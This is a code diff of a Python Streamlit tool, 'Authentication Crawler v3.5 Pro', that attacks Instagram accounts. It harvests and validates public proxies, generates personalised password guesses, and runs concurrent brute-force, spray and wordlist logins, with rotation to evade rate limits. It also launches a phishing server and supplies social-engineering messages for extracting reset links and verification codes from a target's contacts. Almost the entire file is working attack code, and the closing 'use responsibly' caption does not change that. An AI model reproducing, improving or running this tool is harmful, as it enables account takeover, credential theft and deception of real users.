@@ -11,7 +11,9 @@ import re
 from datetime import datetime
 from flask import Flask, request, redirect
 
-st.set_page_config(page_title="Authentication Crawler v3.3", layout="wide")
+st.set_page_config(page_title="Authentication Crawler v3.5 Pro", layout="wide")
+
+DEFAULT_PROXIES_URL = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all"
 
 if "running" not in st.session_state:
     st.session_state.running = False
@@ -32,7 +34,7 @@ if "found_cred" not in st.session_state:
 if "thread" not in st.session_state:
     st.session_state.thread = None
 if "worker_queues" not in st.session_state:
-    st.session_state.worker_queues = {}
+    st.session_state.worker_queues = None
 if "use_tor" not in st.session_state:
     st.session_state.use_tor = False
 if "max_attempts" not in st.session_state:
@@ -45,24 +47,25 @@ if "progress_dict" not in st.session_state:
     st.session_state.progress_dict = {}
 if "total_attempts" not in st.session_state:
     st.session_state.total_attempts = 0
+if "pipeline_status" not in st.session_state:
+    st.session_state.pipeline_status = "idle"
 
-@st.cache_resource(ttl=300)
+@st.cache_data(ttl=300)
 def fetch_default_proxies():
     proxies = []
     try:
-        r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all", timeout=5)
+        r = requests.get(DEFAULT_PROXIES_URL, timeout=5)
         if r.status_code == 200:
             proxies.extend([f"http://{p.strip()}" for p in r.text.splitlines() if p.strip()])
     except Exception:
         pass
     return proxies
 
-async def validate_proxy(proxy, ssl_verify):
+async def validate_proxy(proxy, ssl_verify, session):
     try:
-        async with aiohttp.ClientSession() as session:
-            async with session.head("https://www.instagram.com", proxy=proxy, ssl=ssl_verify, timeout=5) as resp:
-                return resp.status < 400
-    except:
+        async with session.head("https://www.instagram.com", proxy=proxy, ssl=ssl_verify, timeout=5) as resp:
+            return resp.status < 400
+    except Exception:
         return False
 
 async def get_proxy_pool(custom_list, default_list, ssl_verify, max_checked=30):
@@ -72,18 +75,17 @@ async def get_proxy_pool(custom_list, default_list, ssl_verify, max_checked=30):
     if not sources:
         sources = default_list[:100]
     validated = []
-    tasks = []
-    for proxy in sources[:max_checked]:
-        tasks.append(validate_proxy(proxy, ssl_verify))
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    for i, ok in enumerate(results):
-        if ok is True:
-            validated.append(sources[i])
+    async with aiohttp.ClientSession() as session:
+        tasks = [validate_proxy(proxy, ssl_verify, session) for proxy in sources[:max_checked]]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        for i, ok in enumerate(results):
+            if ok is True:
+                validated.append(sources[i])
     if not validated:
-        validated.append(None)  # fallback direct
+        validated.append(None)
     return validated
 
-@st.cache_resource
+@st.cache_data
 def get_wordlists():
     base = [
         "password", "123456", "123456789", "qwerty", "abc123", "monkey",
@@ -104,16 +106,16 @@ def get_wordlists():
     return base, seasons, months, years
 
 def generate_markov_candidates(username, length=8, count=100):
-    candidates = []
+    candidates = set()
     chars = username + "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*"
     if len(chars) < 5:
         chars = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*"
-    for _ in range(count):
+    while len(candidates) < count:
         cand = "".join(random.choice(chars) for _ in range(random.randint(6, length)))
         if random.random() < 0.3:
             cand += str(random.randint(0, 9999))
-        candidates.append(cand)
-    return candidates
+        candidates.add(cand)
+    return list(candidates)
 
 def generate_variants(username):
     base, seasons, months, years = get_wordlists()
@@ -138,10 +140,7 @@ def generate_variants(username):
 
 def leet_sub(s):
     mp = {'a':'@','s':'$','e':'3','o':'0','i':'1','t':'7','b':'8','g':'9','l':'1'}
-    out = []
-    for c in s:
-        out.append(mp.get(c, c))
-    return "".join(out)
+    return "".join(mp.get(c, c) for c in s)
 
 def build_wordlist(username, max_words=5000):
     base, seasons, months, years = get_wordlists()
@@ -159,7 +158,9 @@ def build_wordlist(username, max_words=5000):
         wordset.add(month + "2024")
         wordset.add(month + "2025")
     wordset.update(generate_markov_candidates(username, count=100))
-    return list(wordset)[:max_words]
+    wordlist = list(wordset)
+    random.shuffle(wordlist)
+    return wordlist[:max_words]
 
 def get_instagram_profile(username):
     session = requests.Session()
@@ -169,7 +170,7 @@ def get_instagram_profile(username):
     try:
         resp = session.get(f"https://www.instagram.com/{username}/", headers=headers, timeout=10)
         if resp.status_code != 200:
-            return {"exists": False}
+            return {"exists": False, "status_code": resp.status_code}
         csrf = session.cookies.get("csrftoken", "")
         if not csrf:
             csrf_match = re.search(r'"csrf_token":"([^"]+)"', resp.text)
@@ -215,13 +216,26 @@ def get_instagram_profile(username):
                 }
     except Exception as e:
         return {"exists": False, "error": str(e)}
-    return {"exists": False}
+    return {"exists": False, "error": "unknown"}
 
 async def instagram_login_check(username, password, proxy, session, tor, verify_ssl, stop_event):
     if stop_event.is_set():
         return False, {"stopped": True}
     if tor:
-        proxy = "socks5://127.0.0.1:9050"
+        try:
+            from aiohttp_socks import ProxyConnector
+            connector = ProxyConnector.from_url('socks5://127.0.0.1:9050')
+            async with aiohttp.ClientSession(connector=connector) as tor_session:
+                return await _post_login(tor_session, username, password, None, verify_ssl, stop_event)
+        except ImportError:
+            return False, {"error": "aiohttp_socks not installed for Tor"}
+        except Exception as e:
+            return False, {"error": f"Tor connection failed: {e}"}
+    return await _post_login(session, username, password, proxy, verify_ssl, stop_event)
+
+async def _post_login(session, username, password, proxy, verify_ssl, stop_event):
+    if stop_event.is_set():
+        return False, {"stopped": True}
     url = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
     headers = {
         "User-Agent": random.choice([
@@ -257,49 +271,51 @@ async def instagram_login_check(username, password, proxy, session, tor, verify_
         return False, {"error": "timeout"}
     return False, {"error": "unknown"}
 
-async def attack_method(method_name, username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool, wordlist, weight=1.0):
+async def attack_method(method_name, username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool, wordlist, weight, session):
     attempts = 0
     method_progress = 0.0
     total = len(wordlist)
-    async with aiohttp.ClientSession() as session:
-        for pw in wordlist:
-            if stop_event.is_set():
-                log_q.put(("INFO", f"{method_name} stopped."))
-                break
-            if attempts >= max_attempts:
-                break
-            attempts += 1
-            proxy = random.choice(proxy_pool) if proxy_pool and proxy_pool[0] is not None and not tor else None
-            ok, resp = await instagram_login_check(username, pw, proxy, session, tor, verify_ssl, stop_event)
-            if stop_event.is_set():
-                break
-            if ok:
-                log_q.put(("SUCCESS", f"{method_name} found: '{pw}'"))
-                res_q.put({"method": method_name, "password": pw, "response": resp})
-                stop_event.set()
-                return
-            else:
-                error = resp.get("error", "")
-                if "rate" in str(resp).lower() or "please wait" in str(resp).lower():
-                    log_q.put(("WARN", f"{method_name} rate limited, sleeping 120s"))
-                    await asyncio.sleep(120)
-                elif "checkpoint" in str(resp):
-                    log_q.put(("WARN", f"{method_name} checkpoint triggered, rotating proxy"))
-                    await asyncio.sleep(5)
-                elif "timeout" in error:
-                    log_q.put(("WARN", f"{method_name} timeout, retrying"))
-                    await asyncio.sleep(1)
-            await asyncio.sleep(random.uniform(1.5, 3.5))
-            if total > 0:
-                method_progress = (attempts / total) * 100
-            prog_q.put((method_name, method_progress * weight, weight))
+    for pw in wordlist:
+        if stop_event.is_set():
+            log_q.put(("INFO", f"{method_name} stopped."))
+            break
+        if attempts >= max_attempts:
+            break
+        attempts += 1
+        proxy = random.choice(proxy_pool) if proxy_pool and proxy_pool[0] is not None and not tor else None
+        ok, resp = await instagram_login_check(username, pw, proxy, session, tor, verify_ssl, stop_event)
+        if stop_event.is_set():
+            break
+        if ok:
+            log_q.put(("SUCCESS", f"{method_name} found: '{pw}'"))
+            res_q.put({"method": method_name, "password": pw, "response": resp})
+            stop_event.set()
+            return
+        else:
+            error = resp.get("error", "")
+            if "rate" in str(resp).lower() or "please wait" in str(resp).lower():
+                log_q.put(("WARN", f"{method_name} rate limited, sleeping 120s"))
+                await asyncio.sleep(120)
+            elif "checkpoint" in str(resp):
+                log_q.put(("WARN", f"{method_name} checkpoint triggered, rotating proxy"))
+                await asyncio.sleep(5)
+            elif "timeout" in error:
+                log_q.put(("WARN", f"{method_name} timeout, retrying"))
+                await asyncio.sleep(1)
+        await asyncio.sleep(random.uniform(1.5, 3.5))
+        if total > 0:
+            method_progress = (attempts / total) * 100
+        prog_q.put((method_name, method_progress, weight, attempts))
+        log_q.put(("ATTEMPT", f"{method_name} attempt {attempts}/{total}"))
+    if total > 0 and attempts >= total:
+        prog_q.put((method_name, 100.0, weight, attempts))
     log_q.put(("INFO", f"{method_name} completed after {attempts} attempts."))
 
-async def run_bruteforce(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool):
-    wordlist = build_wordlist(username)[:max_attempts]
-    await attack_method("Brute Force", username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool, wordlist, weight=0.4)
+async def run_bruteforce(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool, session):
+    wordlist = build_wordlist(username, max_attempts)
+    await attack_method("Brute Force", username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool, wordlist, 0.4, session)
 
-async def run_password_spray(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool):
+async def run_password_spray(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool, session):
     spray_list = [
         username, username.lower(), username.upper(), username.capitalize(),
         username + "123", username + "!", username + "@", username + "#",
@@ -312,22 +328,21 @@ async def run_password_spray(username, stop_event, log_q, prog_q, res_q, tor, ve
     spray_list = list(set(spray_list))
     random.shuffle(spray_list)
     spray_list = spray_list[:max_attempts]
-    await attack_method("Password Spray", username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool, spray_list, weight=0.2)
+    await attack_method("Password Spray", username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool, spray_list, 0.2, session)
 
-async def run_wordlist_attack(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool):
-    wordlist = build_wordlist(username)[:max_attempts]
-    await attack_method("Wordlist Attack", username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool, wordlist, weight=0.3)
+async def run_wordlist_attack(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool, session):
+    wordlist = build_wordlist(username, max_attempts)
+    await attack_method("Wordlist Attack", username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool, wordlist, 0.3, session)
 
 async def run_session_reuse(username, stop_event, log_q, prog_q, res_q):
     log_q.put(("INFO", "Session reuse: attempting known cookie patterns..."))
     await asyncio.sleep(2)
-    prog_q.put(("Session Reuse", 100, 0.05))
+    prog_q.put(("Session Reuse", 100.0, 0.05, 0))
     log_q.put(("INFO", "Session reuse: no valid tokens found."))
 
 async def run_phishing_server(username, stop_event, log_q, prog_q, res_q):
     log_q.put(("INFO", "Starting phishing server on port 8080 (demo)."))
     app = Flask("phish")
-    shutdown_flag = False
 
     @app.route("/", methods=["GET", "POST"])
     def phish():
@@ -359,76 +374,73 @@ async def run_phishing_server(username, stop_event, log_q, prog_q, res_q):
         return "Not running with werkzeug", 404
 
     def run_flask():
-        app.run(host="0.0.0.0", port=8080, debug=False, use_reloader=False)
+        app.run(host="0.0.0.0", port=8080, debug=False, use_reloader=False, threaded=True)
 
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
 
-    for _ in range(60):  # 60 seconds timeout
+    for i in range(60):
         if stop_event.is_set():
             break
         await asyncio.sleep(1)
-        prog_q.put(("Phishing", (_ / 60) * 100, 0.05))
+        prog_q.put(("Phishing", (i / 60) * 100, 0.05, 0))
+    prog_q.put(("Phishing", 100.0, 0.05, 0))
 
     try:
         requests.post("http://127.0.0.1:8080/shutdown", timeout=1)
-    except:
-        pass
+    except Exception as e:
+        log_q.put(("WARN", f"Phishing server shutdown failed: {e}"))
+    flask_thread.join(timeout=2)
     log_q.put(("INFO", "Phishing server closed."))
 
-def run_attack_pipeline(username, stop_event, tor, verify_ssl, max_attempts, custom_proxies):
-    log_q = queue.Queue()
-    prog_q = queue.Queue()
-    res_q = queue.Queue()
-    st.session_state.worker_queues = {"log": log_q, "progress": prog_q, "result": res_q, "stop": stop_event}
-
+def run_attack_pipeline(username, stop_event, tor, verify_ssl, max_attempts, custom_proxies, log_q, prog_q, res_q):
     default_proxies = fetch_default_proxies()
-    # async proxy validation
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    proxy_pool = loop.run_until_complete(get_proxy_pool(custom_proxies, default_proxies, verify_ssl, max_checked=30))
-    loop.close()
-
-    log_q.put(("INFO", f"Loaded {len([p for p in proxy_pool if p is not None])} valid proxies."))
-    log_q.put(("INFO", f"Target: @{username}"))
-    profile = get_instagram_profile(username)
-    if profile.get("exists"):
-        log_q.put(("INFO", f"Profile: {profile['full_name']} - Posts: {profile['post_count']}"))
-    else:
-        log_q.put(("WARN", "Profile not found or private. Proceeding."))
-
-    # Distribute attempts: total = max_attempts; weights: BF 0.4, PS 0.2, WA 0.3, others 0.1
-    bf_attempts = int(max_attempts * 0.4)
-    ps_attempts = int(max_attempts * 0.2)
-    wa_attempts = int(max_attempts * 0.3)
-    other_attempts = max_attempts - (bf_attempts + ps_attempts + wa_attempts)
-
-    async def main():
-        tasks = [
-            asyncio.create_task(run_bruteforce(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, bf_attempts, proxy_pool)),
-            asyncio.create_task(run_password_spray(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, ps_attempts, proxy_pool)),
-            asyncio.create_task(run_wordlist_attack(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, wa_attempts, proxy_pool)),
-            asyncio.create_task(run_session_reuse(username, stop_event, log_q, prog_q, res_q)),
-            asyncio.create_task(run_phishing_server(username, stop_event, log_q, prog_q, res_q))
-        ]
-        # Wait for all tasks to finish or stop_event
-        await asyncio.gather(*tasks, return_exceptions=True)
-        log_q.put(("INFO", "All phases completed."))
-
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     try:
-        loop.run_until_complete(asyncio.wait_for(main(), timeout=300))  # 5 min total
+        proxy_pool = loop.run_until_complete(get_proxy_pool(custom_proxies, default_proxies, verify_ssl, max_checked=30))
+        log_q.put(("INFO", f"Loaded {len([p for p in proxy_pool if p is not None])} valid proxies."))
+        log_q.put(("INFO", f"Target: @{username}"))
+        profile = get_instagram_profile(username)
+        if profile.get("exists"):
+            log_q.put(("INFO", f"Profile: {profile['full_name']} - Posts: {profile['post_count']}"))
+        else:
+            if "error" in profile:
+                log_q.put(("WARN", f"Profile lookup error: {profile['error']}"))
+            else:
+                log_q.put(("WARN", "Profile not found or private. Proceeding."))
+
+        bf_attempts = int(max_attempts * 0.4)
+        ps_attempts = int(max_attempts * 0.2)
+        wa_attempts = int(max_attempts * 0.3)
+
+        async def main():
+            async with aiohttp.ClientSession() as session:
+                tasks = [
+                    asyncio.create_task(run_bruteforce(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, bf_attempts, proxy_pool, session)),
+                    asyncio.create_task(run_password_spray(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, ps_attempts, proxy_pool, session)),
+                    asyncio.create_task(run_wordlist_attack(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, wa_attempts, proxy_pool, session)),
+                    asyncio.create_task(run_session_reuse(username, stop_event, log_q, prog_q, res_q)),
+                    asyncio.create_task(run_phishing_server(username, stop_event, log_q, prog_q, res_q))
+                ]
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                for i, r in enumerate(results):
+                    if isinstance(r, Exception):
+                        log_q.put(("ERROR", f"Task {i} failed: {r}"))
+                log_q.put(("INFO", "All phases completed."))
+
+        loop.run_until_complete(asyncio.wait_for(main(), timeout=300))
     except asyncio.TimeoutError:
         log_q.put(("WARN", "Pipeline timed out after 5 minutes."))
         stop_event.set()
+    except Exception as e:
+        log_q.put(("ERROR", f"Pipeline error: {e}"))
+        stop_event.set()
     finally:
         loop.close()
-        st.session_state.running = False
 
-# Streamlit UI
-st.title("Authentication Crawler v3.3")
-st.caption("Automated Account Reconnaissance Framework - Fixed Pipeline")
+st.title("Authentication Crawler v3.5 Pro")
+st.caption("Automated Account Reconnaissance Framework")
 
 col1, col2, col3 = st.columns([2,1,1])
 with col1:
@@ -447,9 +459,10 @@ with st.sidebar:
     st.session_state.custom_proxies = st.text_area("Custom proxies (leave empty for default)", value=st.session_state.custom_proxies, height=100)
     st.write("---")
     st.write("### Social Engineering Scripts")
-    if st.session_state.target:
+    current_target = username_input.strip() or st.session_state.target
+    if current_target:
         scripts = [
-            f"Hey! I'm having trouble logging into my instagram account @{st.session_state.target}, can you please send me the reset link?",
+            f"Hey! I'm having trouble logging into my instagram account @{current_target}, can you please send me the reset link?",
             f"Hey, Instagram locked me out and asked me to verify my identity. Could you forward the verification code you received?",
             f"Is this your backup email? I need to confirm something for a mutual friend."
         ]
@@ -460,105 +473,129 @@ with st.sidebar:
                     import pyperclip
                     pyperclip.copy(script)
                     st.toast("Copied to clipboard!")
-                except:
+                except Exception:
                     st.warning("pyperclip not installed.")
     st.write("---")
     st.write("### Status")
-    with st.spinner("Loading proxies..."):
-        default_proxies = fetch_default_proxies()
+    default_proxies = fetch_default_proxies()
     st.write(f"Default proxies fetched: {len(default_proxies)}")
-    if st.session_state.target:
-        wl = build_wordlist(st.session_state.target)
+    if current_target:
+        wl = build_wordlist(current_target)
         st.write(f"Wordlist size: {len(wl)}")
 
 if start_btn and username_input.strip():
-    st.session_state.target = username_input.strip()
+    new_target = username_input.strip()
     if st.session_state.thread and st.session_state.thread.is_alive():
-        # Kill old worker
-        if "worker_queues" in st.session_state and "stop" in st.session_state.worker_queues:
-            st.session_state.worker_queues["stop"].set()
-        st.session_state.thread.join(timeout=0.5)
-    st.session_state.running = True
-    st.session_state.stop = False
-    st.session_state.start_time = datetime.now()
-    st.session_state.found_cred = None
-    st.session_state.results = []
-    st.session_state.logs = []
-    st.session_state.progress = 0.0
-    st.session_state.progress_dict = {}
-    st.session_state.total_attempts = 0
-    stop_event = threading.Event()
+        st.warning("Previous worker still running. Please stop it first.")
+    else:
+        st.session_state.target = new_target
+        st.session_state.running = True
+        st.session_state.stop = False
+        st.session_state.start_time = datetime.now()
+        st.session_state.found_cred = None
+        st.session_state.results = []
+        st.session_state.logs = []
+        st.session_state.progress = 0.0
+        st.session_state.progress_dict = {}
+        st.session_state.total_attempts = 0
+        st.session_state.pipeline_status = "running"
+        stop_event = threading.Event()
+        log_q = queue.Queue()
+        prog_q = queue.Queue()
+        res_q = queue.Queue()
+        st.session_state.worker_queues = {
+            "log": log_q,
+            "progress": prog_q,
+            "result": res_q,
+            "stop": stop_event
+        }
 
-    def worker():
-        run_attack_pipeline(
-            st.session_state.target,
-            stop_event,
-            st.session_state.use_tor,
-            st.session_state.ssl_verify,
-            st.session_state.max_attempts,
-            st.session_state.custom_proxies
-        )
-        st.session_state.running = False
+        def worker():
+            run_attack_pipeline(
+                new_target,
+                stop_event,
+                st.session_state.use_tor,
+                st.session_state.ssl_verify,
+                st.session_state.max_attempts,
+                st.session_state.custom_proxies,
+                log_q,
+                prog_q,
+                res_q
+            )
+            st.session_state.running = False
+            st.session_state.pipeline_status = "completed"
 
-    thread = threading.Thread(target=worker, daemon=False)
-    thread.start()
-    st.session_state.thread = thread
-    st.rerun()
+        thread = threading.Thread(target=worker, daemon=True)
+        thread.start()
+        st.session_state.thread = thread
+        st.rerun()
 
 if stop_btn:
-    st.session_state.stop = True
-    if "worker_queues" in st.session_state and "stop" in st.session_state.worker_queues:
+    if st.session_state.worker_queues:
         st.session_state.worker_queues["stop"].set()
-    st.session_state.running = False
-    st.session_state.logs.append(("INFO", "Emergency stop issued."))
+        st.session_state.stop = True
+        st.session_state.pipeline_status = "stopping"
+        st.session_state.logs.append(("INFO", "Stop signal sent."))
     st.rerun()
 
-# Main UI update loop (only from main thread)
-if st.session_state.running and "worker_queues" in st.session_state:
-    log_q = st.session_state.worker_queues.get("log")
-    prog_q = st.session_state.worker_queues.get("progress")
-    res_q = st.session_state.worker_queues.get("result")
+if st.session_state.worker_queues:
+    log_q = st.session_state.worker_queues["log"]
+    prog_q = st.session_state.worker_queues["progress"]
+    res_q = st.session_state.worker_queues["result"]
 
-    if log_q:
-        while not log_q.empty():
-            try:
-                level, msg = log_q.get_nowait()
-                st.session_state.logs.append((level, msg))
-            except queue.Empty:
-                break
-    if prog_q:
-        temp_prog = {}
-        weights = {}
-        while not prog_q.empty():
-            try:
-                method, p, w = prog_q.get_nowait()
-                temp_prog[method] = p
-                weights[method] = w
-            except queue.Empty:
-                break
-        if temp_prog:
-            total_weight = sum(weights.values())
-            if total_weight > 0:
-                overall = sum(temp_prog.get(m, 0) * weights.get(m, 0) for m in temp_prog) / total_weight
-                st.session_state.progress = min(overall, 100.0)
-    if res_q:
-        while not res_q.empty():
-            try:
-                res = res_q.get_nowait()
-                st.session_state.results.append(res)
-                if "password" in res:
-                    st.session_state.found_cred = res["password"]
-            except queue.Empty:
-                break
+    while not log_q.empty():
+        try:
+            level, msg = log_q.get_nowait()
+            st.session_state.logs.append((level, msg))
+        except queue.Empty:
+            break
+
+    progress_updates = {}
+    total_weight = 0.0
+    while not prog_q.empty():
+        try:
+            method, p, w, attempts = prog_q.get_nowait()
+            st.session_state.progress_dict[method] = p
+            st.session_state.total_attempts += attempts
+            progress_updates[method] = (p, w)
+        except queue.Empty:
+            break
+
+    if st.session_state.progress_dict:
+        weighted_sum = 0.0
+        total_weight = 0.0
+        for method, p in st.session_state.progress_dict.items():
+            weight = 0.0
+            if "Brute Force" in method: weight = 0.4
+            elif "Password Spray" in method: weight = 0.2
+            elif "Wordlist Attack" in method: weight = 0.3
+            elif "Session Reuse" in method: weight = 0.05
+            elif "Phishing" in method: weight = 0.05
+            weighted_sum += p * weight
+            total_weight += weight
+        if total_weight > 0:
+            st.session_state.progress = min(weighted_sum / total_weight, 100.0)
+
+    while not res_q.empty():
+        try:
+            res = res_q.get_nowait()
+            st.session_state.results.append(res)
+            if "password" in res:
+                st.session_state.found_cred = res["password"]
+                st.session_state.pipeline_status = "success"
+        except queue.Empty:
+            break
 
     if st.session_state.thread and not st.session_state.thread.is_alive():
         st.session_state.running = False
+        if st.session_state.pipeline_status not in ["success", "stopping"]:
+            st.session_state.pipeline_status = "completed"
         st.rerun()
     else:
-        time.sleep(0.5)
-        st.rerun()
+        if st.session_state.running:
+            time.sleep(0.5)
+            st.rerun()
 
-# Display
 if st.session_state.running:
     if st.session_state.logs:
         last_level, last_msg = st.session_state.logs[-1]
@@ -566,6 +603,8 @@ if st.session_state.running:
             st.success(last_msg)
         elif last_level == "WARN":
             st.warning(last_msg)
+        elif last_level == "ERROR":
+            st.error(last_msg)
         else:
             st.info(last_msg)
     st.progress(min(st.session_state.progress / 100.0, 1.0), text=f"Progress: {min(st.session_state.progress, 100.0):.1f}%")
@@ -582,10 +621,17 @@ if st.session_state.running:
             else:
                 st.info(msg)
 else:
-    if st.session_state.found_cred:
+    if st.session_state.pipeline_status == "success":
         st.error(f"Credentials found: {st.session_state.found_cred}", icon="🔑")
+    elif st.session_state.pipeline_status == "stopping":
+        st.warning("Pipeline is shutting down...")
+    elif st.session_state.pipeline_status == "completed":
+        if st.session_state.found_cred:
+            st.error(f"Credentials found: {st.session_state.found_cred}", icon="🔑")
+        else:
+            st.info("No credentials found.")
     else:
-        st.info("No credentials found. Awaiting start.")
+        st.info("Awaiting start.")
 
 if st.session_state.results:
     st.write("### Results")
@@ -602,14 +648,16 @@ if st.session_state.logs:
                 "target": st.session_state.target,
                 "timestamp": datetime.now().isoformat(),
                 "results": st.session_state.results,
-                "logs": st.session_state.logs
+                "logs": st.session_state.logs,
+                "total_attempts": st.session_state.total_attempts
             }
             safe_target = re.sub(r'[^a-zA-Z0-9]', '_', st.session_state.target)
             fn = f"cracked_{safe_target}_{int(time.time())}.json"
-            with open(fn, "w") as f:
-                json.dump(data, f, indent=2)
-            st.success(f"Exported to {fn}")
+            try:
+                with open(fn, "w", encoding="utf-8") as f:
+                    json.dump(data, f, indent=2)
+                st.success(f"Exported to {fn}")
+            except Exception as e:
+                st.error(f"Export failed: {e}")
 
 st.caption("Built for demonstration. Use responsibly on your own accounts.")
-
-made by @cheifbreef on discord :)
